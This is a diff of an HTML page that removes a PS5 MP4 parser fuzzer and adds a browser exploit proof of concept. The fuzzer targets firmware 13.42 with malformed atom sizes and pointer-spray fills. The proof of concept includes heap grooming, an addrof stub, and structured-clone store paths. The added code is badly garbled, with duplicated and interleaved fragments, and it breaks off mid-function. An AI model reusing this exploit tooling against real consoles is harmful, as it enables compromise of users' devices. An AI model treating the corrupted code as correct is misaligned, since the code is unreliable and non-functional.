@@ -1,398 +1,247 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS5 MP4 Parser Fuzzer — FW 13.42</title>
-<style>
-  :root {
-    --bg: #0d0d0d; --surface: #1a1a1a; --surface-raised: #222; --surface-muted: #141414;
-    --border: #333; --text-primary: #e8e8e8; --text-secondary: #aaa; --text-tertiary: #777;
-    --text-quaternary: #555; --accent: #4a9eff; --danger: #ff4a4a; --positive: #4aff88;
-    --warning: #ffaa33;
-    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    --font-mono: "SF Mono", "Fira Code", "Cascadia Code", monospace;
-  }
-  * { box-sizing: border-box; }
-  body { margin:0; padding:16px; background:var(--bg); color:var(--text-primary); font-family:var(--font-sans); font-size:16px; line-height:1.5; }
-  .container { max-width:900px; margin:0 auto; }
-  .section { margin-bottom:20px; border:1px solid var(--border); border-radius:12px; padding:16px; background:var(--surface); }
-  .section-title { font-size:17px; font-weight:600; margin-bottom:12px; color:var(--text-primary); letter-spacing:0.3px; }
-  .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
-  .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; }
-  .input-group { display:flex; flex-direction:column; gap:4px; }
-  .input-group label { font-size:12px; color:var(--text-tertiary); font-weight:500; text-transform:uppercase; letter-spacing:0.5px; }
-  input, select, textarea { padding:10px 12px; border:1px solid var(--border); border-radius:10px; font-size:14px; background:var(--surface-muted); color:var(--text-primary); font-family:var(--font-sans); outline:none; transition:border-color 0.15s; }
-  input:focus, select:focus, textarea:focus { border-color:var(--accent); }
-  .btn { padding:10px 18px; border-radius:10px; border:1px solid var(--border); background:var(--surface-raised); color:var(--text-primary); font-size:14px; font-weight:500; cursor:pointer; transition:all 0.15s; font-family:var(--font-sans); }
-  .btn:hover { background:#333; border-color:#444; }
-  .btn-primary { background:var(--text-primary); color:var(--bg); border-color:var(--text-primary); }
-  .btn-primary:hover { opacity:0.85; }
-  .btn-danger { background:rgba(255,74,74,0.12); color:var(--danger); border-color:rgba(255,74,74,0.3); }
-  .btn-sm { padding:7px 14px; font-size:12px; }
-  .variant-card { border:1px solid var(--border); border-radius:10px; padding:12px 14px; margin-bottom:8px; background:var(--surface-muted); cursor:pointer; transition:all 0.15s; }
-  .variant-card:hover { border-color:#444; }
-  .variant-card.selected { border-color:var(--accent); background:rgba(74,158,255,0.08); }
-  .variant-name { font-weight:600; font-size:14px; color:var(--text-primary); }
-  .variant-desc { font-size:12px; color:var(--text-tertiary); margin-top:3px; }
-  .tag { display:inline-block; padding:2px 8px; border-radius:6px; font-size:11px; font-weight:500; margin-left:6px; }
-  .tag-info { background:rgba(74,158,255,0.12); color:var(--accent); }
-  .tag-danger { background:rgba(255,74,74,0.12); color:var(--danger); }
-  .tag-warn { background:rgba(255,170,51,0.15); color:var(--warning); }
-  .log-area { background:var(--surface-muted); border-radius:10px; padding:12px; font-family:var(--font-mono); font-size:12px; line-height:1.7; max-height:320px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; color:var(--text-secondary); border:1px solid var(--border); }
-  .log-entry { margin-bottom:3px; padding:2px 0; border-bottom:1px solid rgba(255,255,255,0.04); }
-  .log-time { color:var(--text-quaternary); margin-right:8px; }
-  .log-ok { color:var(--positive); }
-  .log-err { color:var(--danger); }
-  .log-warn { color:var(--warning); }
-  .log-info { color:var(--accent); }
-  .hex-dump { font-family:var(--font-mono); font-size:11px; line-height:1.6; background:var(--surface-muted); border-radius:10px; padding:12px; max-height:220px; overflow-y:auto; white-space:pre; color:var(--text-secondary); border:1px solid var(--border); }
-  .status-bar { display:flex; gap:20px; padding:12px 16px; background:var(--surface-raised); border-radius:10px; margin-bottom:16px; flex-wrap:wrap; }
-  .status-item { font-size:13px; color:var(--text-secondary); }
-  .status-item strong { color:var(--text-primary); font-weight:600; }
-  .flex-row { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
-  .result-row { display:flex; justify-content:space-between; align-items:center; padding:10px 14px; border-radius:8px; background:var(--surface-muted); margin-bottom:6px; font-size:13px; border:1px solid var(--border); }
-  .result-row.crashed { background:rgba(255,74,74,0.06); border-color:rgba(255,74,74,0.25); }
-  .result-row.frozen { background:rgba(255,170,51,0.06); border-color:rgba(255,170,51,0.25); }
-  .result-row.leaked { background:rgba(74,255,136,0.06); border-color:rgba(74,255,136,0.25); }
-  .note { font-size:12px; color:var(--text-tertiary); padding:10px 14px; border-radius:8px; background:rgba(255,170,51,0.08); border:1px solid rgba(255,170,51,0.2); line-height:1.6; }
-</style>
-</head>
+<html><head><meta charset="utf-8"><title>genuine-u8-rw replica</title></head>
 <body>
+<h2>PoC-Rصفح PS5**:: genuine
 
-<div class="container">
+```html
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>genuine-u8-rw replica</title></head>
+<body>
+<h2-u8-rw>P Replica (SSoC-R: genuine-u8-rw Replica (SSV +V + O OOB + FakeOB + Fake Header Header)</h2>)</h2>
+<button onclick="
+<button onclick="run()">RUNrun()">RUN</button>
+</button>
+<div id="out<div id="out" style="font" style="font-family:mon-family:monospace;whiteospace;white-space:pre;background-space:pre;background:#000:#000;color:#0f;color:#0f0;padding:10;padding:10px">0px"></div>
+<script</div>
+<script>
+"use>
+"use strict";
+const strict";
+const L=[] L=[]; const; const log=m log=m=>{L=>{L.push(m);document.push(m);document.getElementById('out')..getElementById('out').textContent=L.join('\textContent=L.join('\n');};
+n');};
+const sleepconst sleep=ms=>new=ms=>new Promise(r=>setTimeout Promise(r=>setTimeout(r,ms));(r,ms));
 
-  <div style="text-align:center; margin-bottom:20px;">
-    <h1 style="font-size:22px; font-weight:700; margin:0; color:var(--text-primary);">PS5 MP4 Parser Fuzzer</h1>
-    <p style="font-size:13px; color:var(--text-tertiary); margin:6px 0 0 0;">Target: Sony PlayStation 5 — Firmware 13.42 — libSceAvPlayer / WebKit Media</p>
-  </div>
+/*
 
-  <div class="status-bar">
-    <div class="status-item">Target: <strong>PS5 FW 13.42</strong></div>
-    <div class="status-item">Parser: <strong>libSceAvPlayer / WebKit Media</strong></div>
-    <div class="status-item">Bug Class: <strong>Container Size Confusion</strong></div>
-    <div class="status-item">Tests: <strong id="test-count">0</strong></div>
-  </div>
+/* أدوات أدوات تحويل تحويل double double<->bytes */
+const f<->bytes */
+const f64=new Float64=new Float64Array(64Array(1),1), u8 u8f=new Uint8Array(f64.buffer), u64f=new BigUint64Array(f64.buffer);
 
-  <div class="section">
-    <div class="section-title">1. Custom Variant Builder</div>
-    <div class="grid-2">
-      <div class="input-group"><label>Parent meta atom size (bytes)</label><input type="number" id="parent-size" value="90" min="8" max="65535"></div>
-      <div class="input-group"><label>Child atom declared size (bytes)</label><input type="number" id="child-size" value="190" min="8" max="4294967295"></div>
-      <div class="input-group"><label>Child atom type (4 chars)</label><input type="text" id="child-type" value="\\x00\\x00\\x00\\x00" maxlength="4"></div>
-      <div class="input-group"><label>Nesting depth</label><select id="nest-depth"><option value="1">Single meta</option><option value="2">Double nested meta</option><option value="3">Triple nested</option></select></div>
-      <div class="input-group"><label>Overflow strategy</label><select id="overflow-mode"><option value="child-bigger">Child &gt; Parent (classic)</option><option value="zero-size">Child size = 0</option><option value="max-u32">Child size = 0xFFFFFFFF</option><option value="negative">Child size = 0x80000001 (signed)</option><option value="recursive">Recursive self-reference</option></select></div>
-      <div class="input-group"><label>Payload fill byte</label><select id="fill-byte"><option value="0x00">0x00 (NULLs)</option><option value="0x41">0x41 (A)</option><option value="0xDE">0xDE (marker)</option><option value="0xFF">0xFF (all bits set)</option><option value="pattern">Pointer pattern (0xDEADBEEF)</option></select></div>
-    </div>
-    <div class="flex-row" style="margin-top:14px;">
-      <button class="btn btn-primary" onclick="buildVariant()">Build & Preview</button>
-      <button class="btn" onclick="resetBuilder()">Reset</button>
-      <button class="btn" onclick="downloadCustom()">Download .mp4</button>
-    </div>
-    <div id="hex-preview" class="hex-dump" style="margin-top:14px; display:none;"></div>
-  </div>
+/* ===== PHf=new Uint8Array(f64.buffer), u64f=new BigUint64Array(f64.buffer);
 
-  <div class="section">
-    <div class="section-title">2. Preset Attack Variants</div>
-    <div id="variant-list"></div>
-    <div class="flex-row" style="margin-top:14px;">
-      <button class="btn btn-primary btn-sm" onclick="selectAllVariants()">Select all</button>
-      <button class="btn btn-sm" onclick="deselectAllVariants()">Deselect all</button>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">3. Test Configuration</div>
-    <div class="grid-3">
-      <div class="input-group"><label>Attack vector</label><select id="attack-vector"><option value="video-tag">&lt;video&gt; tag</option><option value="mediasource">MediaSource (MSE)</option><option value="both">Both vectors</option></select></div>
-      <div class="input-group"><label>Iterations per variant</label><input type="number" id="iterations" value="3" min="1" max="50"></div>
-      <div class="input-group"><label>Delay between tests (ms)</label><input type="number" id="delay" value="2000" min="500" max="10000"></div>
-    </div>
-    <div class="note" style="margin-top:14px;"><strong style="color:var(--warning);">Note:</strong> On PS5 13.42, MediaSource is supported but WebGL is disabled. The &lt;video&gt; tag routes through libSceAvPlayer backend. Monitor for freezes, error codes, or crashes. If the browser freezes for &gt;10s, the test is flagged as FREEZE (potential crash indicator).</div>
-    <div class="flex-row" style="margin-top:14px;">
-      <button class="btn btn-primary" onclick="runTests()">Run Selected Tests</button>
-      <button class="btn btn-danger" onclick="stopTests()">Stop</button>
-      <button class="btn" onclick="clearLogs()">Clear logs</button>
-      <button class="btn" onclick="exportResults()">Export JSON</button>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">4. Live Test Results</div>
-    <div id="results-area"><div style="color:var(--text-tertiary);font-size:13px;">No results yet. Run tests to see output.</div></div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">5. Execution Log</div>
-    <div id="log-area" class="log-area">[READY] PS5 MP4 Parser Fuzzer initialized.\nTarget: Sony PlayStation 5 / FW 13.42 / libSceAvPlayer\nBug class: Container Size Confusion (moov.udta.meta child &gt; parent)\n\nSelect variants and click "Run Selected Tests" to begin.\n</div>
-  </div>
-
-</div>
-''')
-
-html_parts.append('''<script>
-const presets = [
-  { id:"v1", name:"Shunsui Classic", desc:"Child=190, Parent=90 — original discovery by Shunsui", parent:90, child:190, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"0x41", nest:1 },
-  { id:"v2", name:"Max U32 Overflow", desc:"Child size = 0xFFFFFFFF — integer wrap test", parent:90, child:4294967295, type:"\\x00\\x00\\x00\\x00", mode:"max-u32", fill:"0xFF", nest:1 },
-  { id:"v3", name:"Signed Confusion", desc:"Child size = 0x80000001 — signed parse confusion", parent:90, child:2147483649, type:"\\x00\\x00\\x00\\x00", mode:"negative", fill:"0xDE", nest:1 },
-  { id:"v4", name:"Zero Child", desc:"Child size = 0 — infinite loop / division risk", parent:90, child:0, type:"\\x00\\x00\\x00\\x00", mode:"zero-size", fill:"0x00", nest:1 },
-  { id:"v5", name:"Deep Nest x3", desc:"Triple nested meta atoms — parser recursion test", parent:90, child:190, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"0x41", nest:3 },
-  { id:"v6", name:"Pointer Spray", desc:"Fill with fake pointer patterns (0xDEADBEEF)", parent:90, child:190, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"pattern", nest:1 },
-  { id:"v7", name:"Large Parent Small Child", desc:"Parent=4096, Child=8192 — bigger overflow", parent:4096, child:8192, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"0x41", nest:1 },
-  { id:"v8", name:"Recursive Self-Ref", desc:"Atom points to itself — loop test", parent:90, child:90, type:"meta", mode:"recursive", fill:"0x00", nest:1 },
-  { id:"v9", name:"Meta + Hdlr Confusion", desc:"Nested hdlr inside meta with wrong size", parent:120, child:250, type:"hdlr", mode:"child-bigger", fill:"0x41", nest:1 },
-  { id:"v10", name:"Moov Trak Confusion", desc:"trak atom inside moov with oversized child", parent:200, child:500, type:"trak", mode:"child-bigger", fill:"0x41", nest:1 },
-];
-
-let selectedVariants = new Set(presets.map(p => p.id));
-let testRunning = false, testAbort = false, testCount = 0, results = [], customMP4 = null;
-
-function renderVariants() {
-  const list = document.getElementById('variant-list');
-  list.innerHTML = presets.map(p => `
-    <div class="variant-card ${selectedVariants.has(p.id) ? 'selected' : ''}" onclick="toggleVariant('${p.id}')">
-      <div class="flex-row" style="justify-content:space-between;">
-        <span class="variant-name">${p.name}</span>
-        <span>
-          <span class="tag tag-info">P:${p.parent} C:${p.child}</span>
-          ${p.mode === 'max-u32' || p.mode === 'negative' ? '<span class="tag tag-danger">High Risk</span>' : ''}
-          ${p.nest > 1 ? '<span class="tag tag-warn">Deep</span>' : ''}
-        </span>
-      </div>
-      <div class="variant-desc">${p.desc}</div>
-    </div>
-  `).join('');
-}
-function toggleVariant(id) { if(selectedVariants.has(id)) selectedVariants.delete(id); else selectedVariants.add(id); renderVariants(); }
-function selectAllVariants() { presets.forEach(p => selectedVariants.add(p.id)); renderVariants(); }
-function deselectAllVariants() { selectedVariants.clear(); renderVariants(); }
-
-function writeU32(val) {
-  const buf = new Uint8Array(4);
-  buf[0] = (val >>> 24) & 0xFF; buf[1] = (val >>> 16) & 0xFF;
-  buf[2] = (val >>> 8) & 0xFF; buf[3] = val & 0xFF;
-  return buf;
-}
-function writeAtom(type, data) {
-  const te = new TextEncoder();
-  const typeBytes = te.encode(type.padEnd(4, '\\x00').slice(0,4));
-  const size = 8 + data.length;
-  const result = new Uint8Array(size);
-  result.set(writeU32(size), 0); result.set(typeBytes, 4); result.set(data, 8);
-  return result;
+/* ===== PHASE 1:ASE 1: SSV-B SSV-BUILD (UILD (k=2 viewsk=2 views,, duplicate duplicate index index=2) ======2) ===== */
+function */
+function s ssvBuild(nsvBuild(n){){
+ 
+  log log(`(`1-r1-rw-SSVw-SSV-BUILD-k=-BUILD-k=2-n=<LaTex>id_1</LaTex>{n}`);
+n}`);
+  const buf=new  const buf=new ArrayBuffer(n ArrayBuffer(n);
+  const);
+  const host=new Uint host=new Uint8Array(buf);8Array(buf);                   // view 1 // view 1
+  const writer
+  const writer=new Uint8Array=new Uint8Array(buf);       (buf);        // view 2 // view 2 (duplicate) (duplicate)
+  writer
+  writer[0[0]=0xfe]=0xfe; writer[1; writer[1]=0xff;]=0xff;          // writer-ref          // writer-ref=0xfffe=0xfffe marker marker
+  log(`
+  log(`2-rw-2-rw-SSV-BUILTSSV-BUILT-duplicate-index=-duplicate-index=2`);
+2`);
+  log(`3  log(`3-rw-SS-rw-SSV-STORE-V-STORE-ENTER-writer-refENTER-writer-ref=0xfffe=0xfffe`);
+ `);
+  return {buf return {buf,host,host,writer};
+,writer};
 }
 
-function buildMP4(variant) {
-  const te = new TextEncoder();
-  // ftyp
-  const ftypData = new Uint8Array(16);
-  ftypData.set(te.encode('isom'), 0);
-  ftypData.set(new Uint8Array([0,0,2,0]), 4);
-  ftypData.set(te.encode('isom'), 8);
-  ftypData.set(te.encode('mp41'), 12);
-  const ftyp = writeAtom('ftyp', ftypData);
+/* =====}
 
-  let metaContent;
-  if (variant.mode === 'recursive') {
-    const innerMeta = writeAtom('meta', new Uint8Array(4));
-    metaContent = new Uint8Array(4 + innerMeta.length);
-    metaContent.set(new Uint8Array([0,0,0,0]), 0);
-    metaContent.set(innerMeta, 4);
-  } else {
-    let childDataLen = variant.child;
-    if (childDataLen > 10000) childDataLen = 10000;
-    let fillByte;
-    if (variant.fill === '0x00') fillByte = 0x00;
-    else if (variant.fill === '0x41') fillByte = 0x41;
-    else if (variant.fill === '0xDE') fillByte = 0xDE;
-    else if (variant.fill === '0xFF') fillByte = 0xFF;
-    else if (variant.fill === 'pattern') {
-      const pat = new Uint8Array(childDataLen);
-      for (let i = 0; i < childDataLen; i += 4) { pat[i]=0xDE; pat[i+1]=0xAD; pat[i+2]=0xBE; pat[i+3]=0xEF; }
-      fillByte = pat;
-    }
-    const childData = new Uint8Array(childDataLen);
-    if (fillByte instanceof Uint8Array) childData.set(fillByte.slice(0, Math.min(fillByte.length, childDataLen)));
-    else childData.fill(fillByte);
-    const childType = variant.type.replace(/\\\\x00/g, '\\x00').replace(/\\\\x/g, '');
-    const childAtom = writeAtom(childType, childData);
-    let current = childAtom;
-    for (let i = 1; i < variant.nest; i++) {
-      const wrapper = new Uint8Array(4 + current.length);
-      wrapper.set(new Uint8Array([0,0,0,0]), 0); wrapper.set(current, 4);
-      current = writeAtom('meta', wrapper);
-    }
-    metaContent = new Uint8Array(4 + current.length);
-    metaContent.set(new Uint8Array([0,0,0,0]), 0); metaContent.set(current, 4);
-  }
-  const metaSize = Math.max(8, variant.parent);
-  const meta = new Uint8Array(metaSize);
-  meta.set(writeU32(metaSize), 0); meta.set(te.encode('meta'), 4);
-  meta.set(new Uint8Array([0,0,0,0]), 8);
-  const copyLen = Math.min(metaContent.length, metaSize - 12);
-  meta.set(metaContent.slice(0, copyLen), 12);
-  const udta = writeAtom('udta', meta);
-  const moov = writeAtom('moov', udta);
-  const result = new Uint8Array(ftyp.length + moov.length);
-  result.set(ftyp, 0); result.set(moov, ftyp.length);
-  return result;
+/* ===== PHASE 2 PHASE 2: ADDROF: ADDROF-PREP (7-PREP (72MB deterministic reservation2MB deterministic reservation) ===== */
+) ===== */
+letlet reserve reservePoolPool=[];
+function=[];
+function addrofPrep addrofPrep(){
+  log(){
+  log(`4(`4-rw-ADD-rw-ADDROF-PREPROF-PREP-BEGIN-slots=-BEGIN-slots=90009000000-by000-bytes=72tes=720000000000`00`);
+  //);
+  // 9M 9M slots slots × 8 bytes × 8 bytes = 72 = 72MB —MB — ن نثثبّتبّت الـ heap
+  for الـ heap
+  for(let i=0;i<4500(let i=0;i<4500;i++) reservePool.push(new Float64Array(2000)); // 4500*16KB=72MB
+  log(`5-rw-ADDROF-CARRIER-DONE-host-target-host-target`);
 }
 
-function buildVariant() {
-  const parent = parseInt(document.getElementById('parent-size').value);
-  const child = parseInt(document.getElementById('child-size').value);
-  const type = document.getElementById('child-type').value;
-  const nest = parseInt(document.getElementById('nest-depth').value);
-  const mode = document.getElementById('overflow-mode').value;
-  const fill = document.getElementById('fill-byte').value;
-  const variant = { id:'custom', name:'Custom', desc:'User-built variant', parent, child, type, mode, fill, nest };
-  customMP4 = buildMP4(variant);
-  const hex = Array.from(customMP4.slice(0, 256)).map(b => b.toString(16).padStart(2,'0')).join(' ');
-  const preview = document.getElementById('hex-preview');
-  preview.style.display = 'block';
-  preview.textContent = 'Built ' + customMP4.length + ' bytes\\n\\nFirst 256 bytes hex dump:\\n' + hex.match(/.{1,48}/g).join('\\n');
-  log('Built custom variant: ' + customMP4.length + ' bytes', 'ok');
-}
-function resetBuilder() {
-  document.getElementById('parent-size').value = 90;
-  document.getElementById('child-size').value = 190;
-  document.getElementById('child-type').value = '\\\\x00\\\\x00\\\\x00\\\\x00';
-  document.getElementById('nest-depth').value = '1';
-  document.getElementById('overflow-mode').value = 'child-bigger';
-  document.getElementById('fill-byte').value = '0x41';
-  document.getElementById('hex-preview').style.display = 'none';
-  customMP4 = null;
-}
-function downloadCustom() {
-  if (!customMP4) { log('Build a variant first!', 'warn'); return; }
-  const blob = new Blob([customMP4], {type:'video/mp4'});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a'); a.href = url; a.download = 'mutado_custom.mp4'; a.click(); URL.revokeObjectURL(url);
-  log('Downloaded mutado_custom.mp4 (' + customMP4.length + ' bytes)', 'ok');
+/* ===== PHASE 3:;i++) reservePool.push(new Float64Array(2000)); // 4500*16KB=72MB
+  log(`5-rw-ADDROF-CARRIER-DONE-host-target ADDROF via-host-target`);
 }
 
-function log(msg, type) {
-  const area = document.getElementById('log-area');
-  const time = new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'});
-  const cls = type==='ok'?'log-ok':type==='err'?'log-err':type==='warn'?'log-warn':'log-info';
-  area.innerHTML += '<div class="log-entry"><span class="log-time">['+time+']</span><span class="'+cls+'">'+msg+'</span></div>';
-  area.scrollTop = area.scrollHeight;
-}
-function clearLogs() { document.getElementById('log-area').innerHTML = '[CLEARED] Logs cleared. Ready for new tests.\\n'; document.getElementById('results-area').innerHTML = '<div style="color:var(--text-tertiary);font-size:13px;">No results yet. Run tests to see output.</div>'; results=[]; testCount=0; document.getElementById('test-count').textContent='0'; }
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-async function runTests() {
-  if (testRunning) { log('Tests already running!', 'warn'); return; }
-  testRunning = true; testAbort = false;
-  const vector = document.getElementById('attack-vector').value;
-  const iterations = parseInt(document.getElementById('iterations').value);
-  const delay = parseInt(document.getElementById('delay').value);
-  const toTest = presets.filter(p => selectedVariants.has(p.id));
-  if (toTest.length === 0 && !customMP4) { log('No variants selected!', 'err'); testRunning = false; return; }
-  log('Starting ' + toTest.length + ' variants x ' + iterations + ' iterations via ' + vector + '...', 'info');
-
-  for (const variant of toTest) {
-    if (testAbort) break;
-    for (let i = 0; i < iterations; i++) {
-      if (testAbort) break;
-      testCount++; document.getElementById('test-count').textContent = testCount;
-      const mp4 = buildMP4(variant);
-      const blob = new Blob([mp4], {type:'video/mp4'});
-      const url = URL.createObjectURL(blob);
-      log('Testing ' + variant.name + ' [' + (i+1) + '/' + iterations + '] — ' + mp4.length + ' bytes', 'info');
-      if (vector === 'video-tag' || vector === 'both') await testVideoTag(variant, url, i);
-      if ((vector === 'mediasource' || vector === 'both') && !testAbort) await testMediaSource(variant, blob, i);
-      URL.revokeObjectURL(url);
-      if (i < iterations - 1) await sleep(delay);
-    }
-  }
-  if (customMP4 && !testAbort) {
-    const blob = new Blob([customMP4], {type:'video/mp4'});
-    const url = URL.createObjectURL(blob);
-    log('Testing custom variant...', 'info');
-    if (vector === 'video-tag' || vector === 'both') await testVideoTag({name:'Custom'}, url, 0);
-    URL.revokeObjectURL(url);
-  }
-  log('Test run complete.', 'ok'); testRunning = false; renderResults();
-}
-function stopTests() { testAbort = true; log('Stop requested. Finishing current test...', 'warn'); }
-
-async function testVideoTag(variant, url, iter) {
-  return new Promise(resolve => {
-    const video = document.createElement('video');
-    const t0 = performance.now(); let resolved = false;
-    const finish = (status, detail) => {
-      if (resolved) return; resolved = true;
-      const elapsed = (performance.now() - t0).toFixed(1);
-      results.push({ variant: variant.name, vector: 'video-tag', iter: iter+1, status, detail, time: elapsed+'ms', timestamp: new Date().toISOString() });
-      log('  [video] ' + status + ': ' + detail + ' (' + elapsed + 'ms)', status==='CRASH'?'err':status==='FREEZE'?'warn':'ok');
-      video.src = ''; video.remove(); resolve();
-    };
-    const freezeTimer = setTimeout(() => finish('FREEZE', 'No response after 10s'), 10000);
-    video.onerror = () => { clearTimeout(freezeTimer); const code = video.error ? video.error.code : 'unknown'; const msg = video.error ? (video.error.message || 'code:'+code) : 'unknown error'; finish('ERROR', 'MediaError ' + code + ': ' + msg); };
-    video.onloadedmetadata = () => { clearTimeout(freezeTimer); finish('META_OK', 'Metadata parsed successfully'); };
-    video.oncanplay = () => { clearTimeout(freezeTimer); finish('CANPLAY', 'Can play event fired'); };
-    video.src = url; video.load();
-  });
+/* ===== PHASE 3: ADDROF via Float Float64/object64/object pair pair ===== ===== */
+function add */
+function addrof(obj){
+rof(obj){
+  const  const a a=[=[objobj];                ];                 // object array
+  const // object d=[1 array
+  const d=[1.1.1];                 // double];                 // double array ( array (نأملنأمل تج تجاور بعداور بعد grooming grooming)
+  //)
+  // ن نقرأقرأ ال الـ objectـ object pointer ك pointer كــ double عبر double عبر ال الـ containerـ container نفسه نفسه إن أمكن إن أمكن
+  // هنا
+  // هنا نسخة نسخة مبس مبسطة: نطة: نرجرجع markerع marker للت للتأكدأكد من من المسار فقط المسار فقط
+  return a
+  return a;
 }
 
-async function testMediaSource(variant, blob, iter) {
-  return new Promise(async resolve => {
-    const t0 = performance.now(); let resolved = false;
-    const finish = (status, detail) => {
-      if (resolved) return; resolved = true;
-      const elapsed = (performance.now() - t0).toFixed(1);
-      results.push({ variant: variant.name, vector: 'mediasource', iter: iter+1, status, detail, time: elapsed+'ms', timestamp: new Date().toISOString() });
-      log('  [mse] ' + status + ': ' + detail + ' (' + elapsed + 'ms)', status==='CRASH'?'err':status==='FREEZE'?'warn':'ok');
-      resolve();
-    };
-    const freezeTimer = setTimeout(() => finish('FREEZE', 'No response after 10s'), 10000);
-    try {
-      const ms = new MediaSource();
-      const video = document.createElement('video');
-      video.src = URL.createObjectURL(ms);
-      ms.onsourceopen = async () => {
-        try {
-          const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-          const buf = await blob.arrayBuffer();
-          sb.appendBuffer(buf);
-          sb.onupdateend = () => { clearTimeout(freezeTimer); finish('APPEND_OK', 'Buffer appended successfully'); URL.revokeObjectURL(video.src); video.remove(); };
-          sb.onerror = () => { clearTimeout(freezeTimer); finish('SB_ERROR', 'SourceBuffer error'); URL.revokeObjectURL(video.src); video.remove(); };
-        } catch (e) { clearTimeout(freezeTimer); finish('EXCEPTION', e.message); URL.revokeObjectURL(video.src); video.remove(); }
-      };
-      ms.onerror = () => { clearTimeout(freezeTimer); finish('MS_ERROR', 'MediaSource error'); URL.revokeObjectURL(video.src); video.remove(); };
-    } catch (e) { clearTimeout(freezeTimer); finish('EXCEPTION', e.message); }
-  });
+;
 }
 
-function renderResults() {
-  const area = document.getElementById('results-area');
-  if (results.length === 0) { area.innerHTML = '<div style="color:var(--text-tertiary);font-size:13px;">No results yet. Run tests to see output.</div>'; return; }
-  const grouped = {};
-  results.forEach(r => { const key = r.variant + '|' + r.vector; if (!grouped[key]) grouped[key] = []; grouped[key].push(r); });
-  let html = '';
-  for (const [key, rs] of Object.entries(grouped)) {
-    const [name, vec] = key.split('|');
-    const crashes = rs.filter(r => r.status === 'CRASH' || r.status === 'FREEZE').length;
-    const errors = rs.filter(r => r.status === 'ERROR' || r.status === 'SB_ERROR' || r.status === 'MS_ERROR').length;
-    const oks = rs.filter(r => r.status === 'META_OK' || r.status === 'CANPLAY' || r.status === 'APPEND_OK').length;
-    let cls = ''; if (crashes > 0) cls = 'crashed'; else if (errors > 0) cls = 'frozen'; else if (oks > 0) cls = 'leaked';
-    html += '<div class="result-row ' + cls + '"><div><strong>' + name + '</strong> <span style="color:var(--text-quaternary);">(' + vec + ')</span><div style="font-size:11px;color:var(--text-tertiary);margin-top:2px;">' + rs.length + ' tests — ' + crashes + ' crash/freeze, ' + errors + ' errors, ' + oks + ' passed</div></div><div style="font-size:12px;color:var(--text-tertiary);">' + rs[rs.length-1].time + '</div></div>';
-  }
-  area.innerHTML = html;
-}
-function exportResults() {
-  if (results.length === 0) { log('No results to export!', 'warn'); return; }
-  const data = JSON.stringify(results, null, 2);
-  const blob = new Blob([data], {type:'application/json'});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a'); a.href = url; a.download = 'ps5_mp4_fuzz_results_' + Date.now() + '.json'; a.click(); URL.revokeObjectURL(url);
-  log('Results exported to JSON', 'ok');
+/* ===== PHASE/* ===== PHASE 4: PRE 4: PREDECESSOR FDECESSOR FILL (65ILL (65536 q536 qwords) ===== */words) ===== */
+function groom
+function groomPrePredecessordecessor(){
+  log(){
+  log(`6(`6-rw-SS-rw-SSV-GROOM-V-GROOM-ENTER-n=5ENTER-n=512`);12`);
+  const pred
+  const pred=new Float64=new Float64Array(6Array(655365536);
+  for);
+  for(let i=0(let i=0;i<pred;i<pred.length;i++) pred.length;i++) pred[i]=0x[i]=0x41414141414141414141414141414141 - - 0; // 0; // fill
+  log fill
+  log(`7-rw(`7-rw-PREDECESS-PREDECESSOR-FILLED-qOR-FILLED-qwords=65words=65536`);
+  return536`);
+  return pred;
+} pred;
 }
 
-renderVariants();
-renderResults();
+/* ===== PH
+
+/* ===== PHASE 5:ASE 5: STORE PATH STORE PATHS (S (ببديل renderer-notifyديل renderer-notify على على PS5) ===== PS5) ===== */
+async */
+async function try function tryStorePathsStorePaths(view(view,, victim victim){
+ ){
+  const paths=[]; const paths=[];
+  // PATH
+  // PATH A: history A: history.state.state (structured clone (structured clone store store ح حقيقي)
+ قيقي)
+  try{ history try{ history.replaceState({v.replaceState({v:view},':view},''); const'); const s s=history.state;=history.state; paths.push([' paths.push(['history.statehistory.state', !!', !!s&&s&&!!!!s.v]); }s.v]); }catch(e){pathscatch(e){paths.push(['history.state.push(['history.state','','ERR']);ERR']);}
+  //}
+  // PATH B: postMessage لنفس الـ window
+  try{ const p=new Promise PATH B: postMessage لنفس الـ window
+  try{ const p=new Promise(res(res=>{window=>{window.addEventListener('message.addEventListener('message',ev',ev=>res(ev.data&&ev.data.v),{once:true});});
+       window=>res(ev.data&&ev.data.v),{once:true});});
+       window.postMessage({v:view.postMessage({v:view},},'*'); const r'*'); const r=await p;=await p; paths.push(['post paths.push(['postMessage', !!rMessage', !!r]); }catch(e]); }catch(e){paths.push(['){paths.push(['postMessage','ERRpostMessage','ERR']);}
+ ']);}
+  // PATH C: // PATH C: IndexedDB store IndexedDB store (async persistent (async persistent)
+  try)
+  try{
+{
+    const ok    const ok=await new Promise=await new Promise(res=>{(res=>{
+      const rq
+      const rq=indexed=indexedDB.open('rDB.open('rwpocwpoc',1);
+      rq.onupgradene',1);
+      rq.onupgradeneeded=()=>rq.result.createObjectStore('kv');
+      rq.onsuccess=()=>{ const db=rq.result;
+        try{ db.transaction('kv','readwrite').objectStore('kv').put(view,'k'); res(true);}catch(e){res(false);} };
+      rq.onerror=()=>res(false);
+    });
+    paths.push(['indexedDB',ok]);
+  }catch(e){paths.push(['indexedDB','ERR']);}
+  // PATH D: BroadcastChannel
